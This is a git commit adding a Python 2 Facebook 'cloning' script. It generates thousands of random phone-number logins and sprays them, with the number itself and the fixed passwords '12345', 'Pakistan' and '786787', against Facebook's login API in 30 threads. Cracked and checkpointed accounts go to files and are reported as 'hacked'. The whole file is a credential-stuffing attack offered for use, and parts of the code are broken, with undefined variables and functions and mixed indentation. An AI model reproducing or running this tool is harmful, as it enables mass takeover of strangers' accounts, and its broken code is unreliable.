cad9faec282f298e115ad276d5c68e66632842fa
Brand boy <68531283+Somi190@users.noreply.github.com>
2020-12-06 08:16:31 +0500

    Create Ub.py

---
+++ Ub.py
@@ -0,0 +1,294 @@
+# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
+#coding=utf-8
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(30000):
+
+    nmbr = random.randint(1111111, 9999999)
+    
+    sys.stdout = open('.txt', 'a')
+
+    print (nmbr)
+
+    sys.stdout.flush()
+    
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install mechanize')
+    
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('python2 .README.md')
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+
+
+def exb():
+    print '[!] Exit Successfully thanku somi'
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(3.0 / 200)
+def tik():
+    titik = [
+     '   ', 'S  ', 'O ', 'M', '  i', '  ', '   ']
+    for o in titik:
+        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
+
+
+os.system("clear")
+print  """
+\033[1;92m _______  _______  _______ _________
+\033[1;93m(  ____ \(  ___  )(       )\__   __/
+\033[1;94m| (    \/| (   ) || () () |   ) (   
+\033[1;93m| (_____ | |   | || || || |   | |   
+\033[1;96m(_____  )| |   | || |(_)| |   | |   
+\033[1;91m      ) || |   | || |   | |   | |   
+\033[1;92m/\____) || (___) || )   ( |___) (___
+\033[1;93m\_______)(_______)|/     \|\_______/
+
+\033[1;93m═════════════ SOMI ════════════════════════════                                    
+
+\033[1;91m➙DEVOLPER   :    SOMI AWAN
+\033[1;96m➙WHATSAAP  :   03455453538
+\033[1;93m➙NOTE   :   USE FAST INTERNET
+\033[1;90m➙NOTE   :   USE 4 TO 6 GB RAM PHONE
+
+\033[1;93m═════════════ SOMI ════════════════════════════
+"""
+logo1 = """
+\033[1;90m
+\033[1;93m═════════════ SOMI ════════════════════════════                                    
+
+\033[1;91m➙DEVOLPER   :    SOMI AWAN
+\033[1;96m➙WHATSAAP  :   03455453538
+\033[1;93m➙NOTE   :   USE FAST INTERNET
+\033[1;90m➙NOTE   :   USE 4 TO 6 GB RAM PHONE
+
+\033[1;93m═════════════ SOMI ════════════════════════════
+
+         
+"""
+logo2 = """
+  \033[1;92m _____    ____    __  __   _____ 
+ \033[1;93m / ____|  / __ \  |  \/  | |_   _|
+ \033[1;94m| (___   | |  | | | \  / |   | |  
+\033[1;95m  \___ \  | |  | | | |\/| |   | |  
+\033[1;96m  ____) | | |__| | | |  | |  _| |_ 
+ \033[1;91m|_____/   \____/  |_|  |_| |_____|
+\033[1;92m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+\033[1;93m CONTACT 03455453538
+\033[1;93m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+\033[1;96m FACEBOOK Somi Awan
+\033[1;93m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+\033[1;92m NOTE USE FAST INTERNET
+\033[1;93m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+\033[1;91m DON'T COPY SCRPIT
+\033[1;96m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+\033[1;94mBASE BAJO GHARI SLOW CHLO 
+\033[1;96m     OR SOUNO MARI BEATS
+\033[1;93m━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+
+"""
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+cpb = []
+def menu():
+    os.system('clear')
+    print logo1
+    print 47* '\033[1;92m='
+    print
+    print
+    jalan('\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]  \x1b[1;93mPAKISTANI CLONING    ')
+    print
+    jalan('\033[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92mEXIT')
+    print
+    print
+    print 47* '\033[1;93m='
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\n \x1b[1;96m>   ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        tik()
+        os.system('clear')
+        print logo2
+        print
+        try:
+        	k = raw_input('\x1b[1;95m Type Any Name  : ')
+            print logo1
+            c = raw_input('\x1b[1;95m Type Any Domin : ')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            Somi()
+
+    elif Somi == '0':
+        login()
+    else:
+        print '[!] Fill in correctly'
+        action()
+    print logo2
+    Somi = raw_input('\x1b[1;93m Type Any Password No1: ')
+    Somii = raw_input('\x1b[1;92m Type Any Password No2: ')
+    Somiii = raw_input('\x1b[1;96m Type Any Password No3: ')
+    print 47* '\033[1;97m='
+    xxx = str(len(id))
+    jalan ('\033[1;96m TOTAL IDS NUMBER : '+xxx)
+    print 47* '\033[1;96m='
+    jalan ('\033[1;92m CODE YOU CHOOSE: '+c)
+    print 47* '\033[1;92m='
+    jalan ("\033[1;91m TO STOP THIS PROCESS PRESS Ctrl THEN z")
+    print 47* '\033[1;91m='
+    jalan(" \033[1;96m               SOMI \033[1;93mBRAND \033[1;96mBOY")
+    print 47* '\033[1;97m='
+            
+    def main(arg):
+        global cpb,oks
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+        	pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[SUCCESS]  ' + k + user + c + '  ===  ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
+                okb.close()
+                oks.append(k + user + c + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;93m[CP ACCOUNT] ' + k + user + c + '  ===  ' + pass1 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
+                cps.close()
+                cpb.append(k + user + c + pass1)
+            else:
+                pass2 = "12345"
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;92m[SUCCESS]  ' + k + user + c + '  ===  ' + pass2 + '\n' + '\n'
+                    okb = open('save/successfull.txt', 'a')
+                    okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
+                    okb.close()
+                    oks.append(k + user + c + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;93m[CP ACCOUNT] ' + k + user + c + '  ===  ' + pass2 + '\n'
+                    cps = open('save/checkpoint.txt', 'a')
+                    cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
+                    cps.close()
+                    cpb.append(k + user + c + pass2)
+                else:
+                    pass3 = "Pakistan"
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m[SUCCESS]  ' + k + user + c + '  ===  ' + pass3 + '\n' + '\n'
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
+                        okb.close()
+                        oks.append(k + user + c + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;93m[CP ACCOUNT] ' + k + user + c + '  ===  ' + pass3 + '\n'
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
+                        cps.close()
+                        cpb.append(k + user + c + pass3)
+                    else:
+                        pass4 = "786787"
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m[SUCCESS]  ' + k + user + c + '  ===  ' + pass4 + '\n' + '\n'
+                            okb = open('save/successfull.txt', 'a')
+                            okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
+                            okb.close()
+                            oks.append(k + user + c + pass4)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;96m[CP ACCOUNT] ' + k + user + c + '  ===  ' + pass4 + '\n'
+                            cps = open('save/checkpoint.txt', 'a')
+                            cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
+                            cps.close()
+                            cpb.append(k + user + c + pass4)
+        	
+                                                                                                                                                                                                                
+                                                                                                                                                                                                                           
+                                                                                                                                                                                                                
+                                                                     
+                                                                                                                                                          
+
+
+
+        except:
+            pass
+        
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
+    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
+    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
+    print 'SOMI BRAND CODING STAR'
+    print ''
+    print """
+    """
+    
+    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
+    login() 
+          
+if __name__ == '__main__':
+    menu()
+
